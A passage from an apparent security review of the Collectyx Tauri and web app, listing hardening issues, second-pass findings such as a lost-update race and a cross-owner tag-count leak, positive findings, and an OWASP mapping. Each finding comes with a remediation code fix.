"csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ipc: http://ipc.localhost; object-src 'none'; base-uri 'none'; form-action 'none'"
```

**c) Vendored dependencies with no provenance or update path.**
`src/include/chart.min.js` is Chart.js v3.9.1 (2022; current major is 4.x) and
`src/include/pako.min.js` is pako 2.1.0. Neither is recorded in any manifest, so
nothing surfaces advisories and there is no upgrade signal. No specific CVE is
asserted here — the finding is the absence of a mechanism, not a known vulnerability.
Record them with pinned versions and checksums:
```
sha256  fbc45926e6b46845a0f905552a0e0b1331049bff1115ecf94dbe0904d895e710  chart.min.js
sha256  ede2693a4a6a5126b9d35669062b358ecab6ae7b9b86a1cf302feb45a8514907  pako.min.js
```

**d) `run_migrations` has no forward-version guard.**
`src-tauri/src/db/migrations.rs:7–22` runs `if version < N` and nothing else. A
binary at schema v2 opening a database written by a future v3 build proceeds
silently against a schema it does not understand — the exact shape that corrupts
data during a downgrade or a sync rollback:
```rust
if version > CURRENT_SCHEMA_VERSION {
    return Err(rusqlite::Error::InvalidParameterName(format!(
        "Database schema v{} is newer than this build supports (v{}). \
         Upgrade {} rather than continuing.",
        version, CURRENT_SCHEMA_VERSION, APP_NAME
    )));
}
```
Also note `get_schema_version` reads `PRAGMA user_version` as `u32` while SQLite
stores it as a signed 32-bit integer; a negative value produces a conversion error
rather than a clear message.

**e) Dead code.**
`src/js/shared-utils.js` is not referenced by `index.html` and redeclares
`const MediaLabels`, which `core.js:254` also declares — adding it to the page would
raise a `SyntaxError` at parse time and halt every script after it. `confirmDialog()`
(`core.js:200`) has no callers and is the sole justification for
`dialog:allow-message`. `restoreBrowseFiles()`, `restoreFileSelected()`,
`restoreContinue()`, `restoreCheckboxChanged()`, `executeRestore()`, and
`closeRestore()` (`backup-restore.js:319–324`) are bridges for markup that no longer
exists. `merge_items`, `attach_tag`, `detach_tag`, and `replaceAllTags` are
registered and reachable over IPC with no caller. Delete the JS; keep the Rust
commands only if a planned feature needs them, and unregister them from
`invoke_handler` until it does.

**f) Mutex poisoning is permanent.**
`AppState.db` is a `Mutex<Connection>` and every command does
`state.db.lock().map_err(|e| e.to_string())?`. Returning an error rather than
panicking is the right call, but once any panic poisons the lock, every subsequent
command fails for the life of the process. Recovering the guard makes this
self-healing:
```rust
let db = state.db.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
```

**g) Unbounded input reads.**
`collection-io.js:475` `await file.text()` and `backup-restore.js:145`
`await file.arrayBuffer()` read the whole selected file into memory with no size
check, and `pako.ungzip` will happily inflate a zip bomb. Cap before reading:
```js
const MAX_IMPORT_BYTES = 50 * 1024 * 1024;
if (file.size > MAX_IMPORT_BYTES) {
    showMessage(`File is too large (max ${MAX_IMPORT_BYTES / 1024 / 1024} MB)`,
                CONSTANTS.MESSAGE_TYPES.ERROR);
    return;
}
```

**h) Raw backend errors surfaced to the UI.**
`tags.js:442` and `:504` render `e.message` directly, which on Tauri is
`rusqlite::Error::to_string()` — SQL fragments, and in some variants file paths.
Low impact on a local app, but it becomes information disclosure the moment these
errors cross a network. Log the detail, show a generic message.

**Tracked as:** `COLLECTYX-SEC-19`

---

## Second Pass

Re-reviewed assuming the first pass missed subtle issues, targeting privilege
escalation, auth bypass, race conditions, business-logic flaws, data leakage,
missing validation, TOCTOU, concurrency, and frontend/backend disagreement.
New findings only.

### SP1 — `saveCollectionRecord` on Tauri is a lost-update race (TOCTOU)

**Severity:** Medium · **Confidence:** High
**Location:** `src/js/db-manager-tauri.js:94–105`.

The partial-payload contract is implemented as read-then-merge-then-write across an
`await`:

```js
const existing = await this.getCollectionRecord(collection, record.id);
if (existing) complete = Object.assign({}, existing, record);
const id = await invoke(this._commands(collection).save, { record: complete });
```

Nothing holds a lock across the two IPC calls. Anything that changes the record in
between is overwritten by the stale snapshot. This is reachable without concurrency
from the user's side: `QueuedModal._shiftRanksAfterSave` issues N of these in
sequence while `TagsView.refreshAll()` (`tags.js:334–340`) fires three view loads
that each re-read the same collection.

The merge also silently reintroduces `Tags`. `existing` is a joined record carrying
`Tags: [...]`, so `Object.assign` puts it back into a payload that deliberately
omitted it — `QueuedModal` omits `Tags` specifically to mean "leave tags alone"
(`queued-modal.js:163–174`). Instead, `reconcile_tags` runs against the snapshot. It
happens to be harmless when the snapshot is current, and silently reverts a
concurrent tag edit when it is not.

**Fix:** move completion into Rust, inside the same transaction as the write, so the
read and the write are atomic. This is the same change §M2 recommends and it
resolves both.

### SP2 — `OwnedView.isQueuedFromLibrary()` reads a view cache that may never have been populated

**Severity:** Low · **Confidence:** High
**Location:** `src/js/owned-view.js:93–96`, called from `rowFn` at `:29`.

```js
isQueuedFromLibrary(itemId) {
    const queuedData = CollectionView.getData(this.QUEUED_CONTAINER_ID);
    return queuedData.some(r => r.ItemId === itemId && r.Source === 'My Library');
}
```

`CollectionView.getData` returns `[]` when `_state['queuedView']` is undefined
(`collection-view.js:200–203`), which is the case until To Be Read has been visited
at least once. The source comment assumes "both views load once per `showView()`
call," but `showView()` loads only the view being navigated to (`core.js:49–56`).

So on a fresh launch, going straight to My Library shows "To Read" on every row,
including books already queued. Clicking it calls `addToReadingList`, which does
fetch fresh queued data for the rank — but only to compute `maxRank`, never to check
for an existing entry. The result is a duplicate `queued` row against the same
`ItemId`.

**Fix:** make the check authoritative rather than opportunistic.

```js
async addToReadingList(recordId, containerId) {
    const record = CollectionView.getRecord(containerId, recordId);
    if (!record) return;
    try {
        const queuedData = await DBManager.getCollection('queued');
        if (queuedData.some(r => r.ItemId === record.ItemId && r.Source === 'My Library')) {
            showMessage(`Already in ${MediaLabels.QueuedLabel}`, CONSTANTS.MESSAGE_TYPES.INFO);
            await this.refreshAll();
            return;
        }
        // ...rest unchanged
```

### SP3 — `replace_all_*` orphans `items` rows indefinitely

**Severity:** Low · **Confidence:** High
**Location:** `src-tauri/src/commands/consumed.rs:170–187` and siblings;
`src/js/db-manager-web.js:659–722`.

`replace_all_*` deletes membership rows and re-creates them through `write_one`,
which calls `upsert_item`. `items` rows are never deleted. An item whose only
membership disappears in a restore stays in the table forever.

Design doc §6.3 states this is intentional — *"an item with no memberships is still
a valid catalogue entry."* The gap is that nothing ever surfaces or reclaims them.
Each restore can add another generation, they are invisible in every view (all three
join through a membership table), and they still carry `item_tags` rows that inflate
the usage counts shown in the Tags view and the Dashboard's Top Tags card. Over
repeated restores this is unbounded growth plus quietly wrong counts.

**Fix:** count orphans and expose them, rather than silently deleting data the design
says to keep.

```rust
#[tauri::command]
pub fn count_orphan_items(state: State<AppState>) -> Result<i64, String> {
    let db = state.db.lock().map_err(|e| e.to_string())?;
    db.query_row(
        "SELECT COUNT(*) FROM items i
          WHERE i.owner = ?1
            AND NOT EXISTS (SELECT 1 FROM consumed WHERE item_id = i.id)
            AND NOT EXISTS (SELECT 1 FROM queued   WHERE item_id = i.id)
            AND NOT EXISTS (SELECT 1 FROM owned    WHERE item_id = i.id)",
        params![common::current_owner(&db)], |r| r.get(0),
    ).map_err(|e| e.to_string())
}
```

### SP4 — Tag usage counts include items the current owner cannot see

**Severity:** Low · **Confidence:** High
**Location:** `src-tauri/src/commands/tags.rs:39–43`;
`src/js/db-manager-web.js:838`.

```sql
SELECT t.id, t.owner, t.name, t.date_added, t.modified,
       (SELECT COUNT(*) FROM item_tags it WHERE it.tag_id = t.id)
  FROM tags t WHERE t.owner = ?1
```

The outer query is owner-scoped; the count subquery is not. `item_tags` has no
`owner` column, so the count includes links from items belonging to other owners
(reachable via §H2's ownership transfer, or via `attach_tag`, which does no owner
check at all). The web backend has the same shape —
`JoinHelpers.tagUsageCounts(itemTags)` counts every link before the owner filter is
applied at `:840`.

This is a small cross-owner information leak: the Tags view and the Dashboard's Top
Tags card reveal that *n* items somewhere carry a tag, when only *m* of them are
visible. It also makes the "Tag deleted, removed from N book(s)" message
(`tags.js:500`) overstate the effect.

**Fix:**

```sql
(SELECT COUNT(*) FROM item_tags it
   JOIN items i2 ON i2.id = it.item_id
  WHERE it.tag_id = t.id AND i2.owner = ?1)
```

```js
// db-manager-web.js — count only this owner's links
const ownedItemIds = new Set(
    (await this._load(CONSTANTS.STORES.ITEMS))
        .filter(i => i.owner === owner).map(i => i.id)
);
const counts = JoinHelpers.tagUsageCounts(
    loaded[1].filter(l => ownedItemIds.has(l.item_id))
);
```

### SP5 — `saveCollectionRecord` returns different values on the two backends

**Severity:** Low · **Confidence:** High
**Location:** `src/js/db-manager-tauri.js:104`; `src/js/db-manager-web.js:645`.

```js
// Tauri
return { id: id, ItemId: complete.ItemId || null };
// Web
return { id: prepared.id, ItemId: prepared.ItemId };
```

For a *new* record the payload carries no `ItemId`, so Tauri returns
`ItemId: null` while the web backend returns the freshly minted id. Design doc §6.1
specifies one signature — `→ { id, ItemId }` — for both.

No current caller uses the returned `ItemId` (`ConsumedModal.save` passes the whole
object to `_onSaved`, which ignores it), so this is latent. It is exactly the kind of
divergence that produces a bug months later in whichever backend the author did not
test against — for example, any future "add to My Library and immediately queue it"
flow would work on web and orphan the record on desktop.

**Fix:** have `save_consumed`/`_queued`/`_owned` return both ids.

```rust
#[derive(Serialize)]
pub struct SaveResult {
    pub id: String,
    #[serde(rename = "ItemId")]
    pub item_id: String,
}

#[tauri::command]
pub fn save_consumed(state: State<AppState>, record: ConsumedRecord) -> Result<SaveResult, String> {
    // write_one already computes item_id via upsert_item — return it.
}
```

### SP6 — `merge_items` silently nulls `pages` on an unparseable resolution

**Severity:** Low · **Confidence:** High
**Location:** `src-tauri/src/commands/items.rs:208–212`.

`load_item_row` stringifies `pages` (`items.rs:297`) so merge resolution can treat
all fields uniformly, then converts back:

```rust
merged.get("pages").cloned().unwrap_or(None).and_then(|s| s.parse::<i64>().ok()),
```

`field_resolutions: HashMap<String, Option<String>>` comes straight from the IPC
payload, so a caller resolving `pages` to any non-numeric string makes `parse` fail
and `and_then` yield `None` — the page count is wiped with no error. The merge
commits.

Phase 9 was dropped so there is no UI for this, but `merge_items` is registered in
`invoke_handler` (`lib.rs:57`) and callable.

**Fix:** validate and reject rather than silently discarding.

```rust
let pages: Option<i64> = match merged.get("pages").cloned().unwrap_or(None) {
    None => None,
    Some(s) if s.trim().is_empty() => None,
    Some(s) => Some(s.trim().parse::<i64>()
        .map_err(|_| format!("Resolution for \"pages\" is not a number: {:?}", s))?),
};
```

---

## Positive Findings

Worth recording, both because they are real and because several are the reason
findings above are not worse.

1. **Every SQL statement is parameterised.** All 40-plus statements across the
   command modules use `params![]` with `?N` placeholders. There is no string
   concatenation into SQL anywhere and therefore no SQL injection. The one
   `format!` in a query (`db-manager-web.js` has none; the Rust `format!` calls are
   in `migrations.rs`) interpolates only compile-time `&'static str` constants.

2. **Zero `unsafe` blocks.** `grep -rn unsafe src-tauri/src/` returns nothing. The
   Rust is entirely safe code, with no raw pointer arithmetic beyond the one address
   read in `new_uuid()` — which is itself sound, just cryptographically useless.

3. **No `eval`, no `Function` constructor, no dynamic script loading, no
   `document.write`.** Verified by grep across all of `src/js/` and `index.html`.

4. **No inline event handlers and no inline `<script>`.**
   `grep -rnE '\bon[a-z]+=' src/index.html` returns nothing, and every `<script>` tag
   carries a `src`. This is the direct result of issue #15's delegated-listener
   migration, and it is what makes the Tauri CSP's `script-src 'self'` actually
   enforceable rather than aspirational.

5. **Escaping is correct everywhere except `dashboard.js`.** `escapeHtml` handles
   `&`, `<`, `>`, `"`, and `'`, all interpolated attributes are quoted, and
   `collection-view.js`, all three `*-view.js` files, `tags.js`, and `sidebar.js`
   apply it consistently. §C1 is a single-file omission, not an absent practice.

6. **`showMessage()` uses `textContent`.** `core.js:78` — the one place where
   arbitrary strings reach the status bar, including raw backend error text, is not
   an injection sink.

7. **Theme paths are validated against an allow-list.** `sanitiseThemePath`
   (`core.js:285–288`) checks the stored value against `CONSTANTS.THEMES` before it
   becomes a `<link href>`, so a restore file cannot point the stylesheet anywhere.
   This is the one place the codebase already treats restored settings as untrusted
   — the pattern §C1 needs applied to `dailyReadingGoal`.

8. **No browser storage misuse.** No `localStorage`, no `sessionStorage`, no
   cookies. All state is in IndexedDB or SQLite.

9. **Foreign keys are on and cascades are correct.** `PRAGMA foreign_keys = ON` at
   `db/mod.rs:26`, `ON DELETE CASCADE` on all four child relationships, and
   `schema-test.js` proves both enforcement and cascade behaviour. The IndexedDB
   backend hand-implements the same cascade in `deleteItem` to match.

10. **`replace_all_*` and `merge_items` are genuinely atomic.** Each wraps its
    `DELETE` and inserts in one `rusqlite` transaction, and `_rawWrite` queues all
    operations synchronously into a single IndexedDB transaction with an explicit
    comment explaining why no `await` may appear inside it — a real and easily-missed
    IndexedDB pitfall, handled correctly.

11. **Lock poisoning does not panic.** Every command uses
    `state.db.lock().map_err(|e| e.to_string())?` rather than `.unwrap()`. The
    permanence noted in L3(f) is a smaller problem than the crash it avoids.

12. **Panics are confined to startup.** The only `panic!`/`expect` calls are in
    `lib.rs` setup and `db/mod.rs::open_db`. Failing loudly when the database cannot
    be opened is right; no request path can panic.

13. **Orphan rows are logged, not silently dropped.** `_onOrphan`
    (`db-manager-web.js:520–527`) and the equivalent Rust behaviour honour the
    project's "never silently drop data" principle.

14. **The web backend's cache invalidation is thought through.** Bulk paths
    invalidate once rather than per row; `deleteItem` and `setAppMeta` invalidate
    everything because owner scope changed. The reasoning is documented at each site.
    §M9 is a gap in an otherwise deliberate design.

15. **Logging is debug-only.** `tauri_plugin_log` is registered under
    `cfg!(debug_assertions)` (`lib.rs:23–29`), so the database path — which contains
    the OS username — is not written to logs in release builds.

16. **The code comments are unusually honest.** `common.rs:113–118` documents the
    exact `COALESCE` limitation §M2 covers, and `collection-io.js:580–588` explains
    why the fs plugin is not used. Several findings here were confirmed faster
    because the code said where its own edges were.

---

## Categories not applicable

Listed for completeness, with the reason.

| Category | Status |
|---|---|
| Authentication / session handling / brute force | N/A — no authentication exists |
| API key management, leakage, enumeration | N/A — no API keys exist |
| CSRF, CORS, replay attacks | N/A — no HTTP server; Tauri IPC is same-process |
| Pagination safety, mass assignment via HTTP | N/A — no REST endpoints (mass assignment *does* exist over IPC: §H2) |
| Tokio async, blocking-in-async, deadlocks, Send/Sync | N/A — synchronous `rusqlite`; the only concurrency primitive is one `Mutex` |
| Command injection | N/A — no process spawning; `shell` is registered but never called (§H3) |
| Path traversal, unsafe file access | N/A — no path is built from user input; the DB path is `dirs_next::data_dir()` + two constants |
| Unsafe deserialization | N/A — `serde_json` into typed structs; no arbitrary type resolution |
| Template injection | N/A — no template engine |
| Timing attacks | N/A — nothing compares a secret |
| Encryption / key management | N/A — no cryptography, and the SQLite file is unencrypted by design |
| Unsafe regex (ReDoS) | Reviewed — all patterns are anchored and linear (`/^[a-z0-9_-]+$/i`, `/^\d{4}-\d{2}-\d{2}$/`, `/^(\d{1,2})\/(\d{1,2})\/(\d{4})$/`). No nested quantifiers, no catastrophic backtracking. |
| Memory safety | Reviewed — no `unsafe`, no `unwrap()` on request paths, no arithmetic that can overflow at realistic scale |

---

## OWASP mapping

| OWASP Top 10 (2021) | Findings |
|---|---|
| A01 Broken Access Control | H1, H2, M10, SP4 |
| A02 Cryptographic Failures | M1 |
| A03 Injection | C1, M4 |
| A04 Insecure Design | C2, M5, M7, M10 |
| A05 Security Misconfiguration | C1 (no CSP in web build), H3, L3(b) |
| A06 Vulnerable & Outdated Components | L3(c) |
| A08 Software & Data Integrity Failures | C2, M5, M8, M9, SP1 |
| A09 Logging & Monitoring Failures | M6 (broken test suite), L3(h) |

| OWASP API Top 10 (2023) | Findings |
|---|---|
| API1 Broken Object Level Authorization | H2, SP4 (IPC boundary) |
| API3 Broken Object Property Level Authorization | H2 (`owner = excluded.owner`), M5 |
| API4 Unrestricted Resource Consumption | M3, M7, L3(g) |
| API6 Unrestricted Access to Sensitive Business Flows | C2, H1 |
| API8 Security Misconfiguration | H3, L3(b) |

---

## Recommended remediation order

1. **`COLLECTYX-SEC-12`** — repair the test suite first. Everything below ships
   without verification until it is green.
2. **`COLLECTYX-SEC-01`, `-02`** — escape the dashboard sinks; add a CSP to the web
   build. Two small patches, largest risk reduction.
3. **`COLLECTYX-SEC-03`** — validate-then-snapshot in restore. Highest data-loss risk.
4. **`COLLECTYX-SEC-06`** — trim capabilities. One file, shrinks the blast radius of
   everything else.
5. **`COLLECTYX-SEC-04`, `-05`** — owner scoping on the destructive paths. Must land
   before any D1 work begins.
6. **`COLLECTYX-SEC-11`, `-09`, `-10`** — backend validation, the statistics DoS, CSV
   export escaping.
7. **`COLLECTYX-SEC-07`, `-08`, `-13`, `-14`, `-15`, `-16`** — ID generation, the
   absent-vs-null contract, rank atomicity, `replaceAllTags`, cache coherence, the
   owner switch.
8. **`COLLECTYX-SEC-17`, `-18`, `-19`, `-20`** — binding guards, date frames,
   hardening, second-pass items.

Issues 4 and 5 both touch `common.rs`; sequence 6 before 5 to avoid a conflict.
Issues `-05` and `-08` both rewrite `upsert_item` — do them as one change.
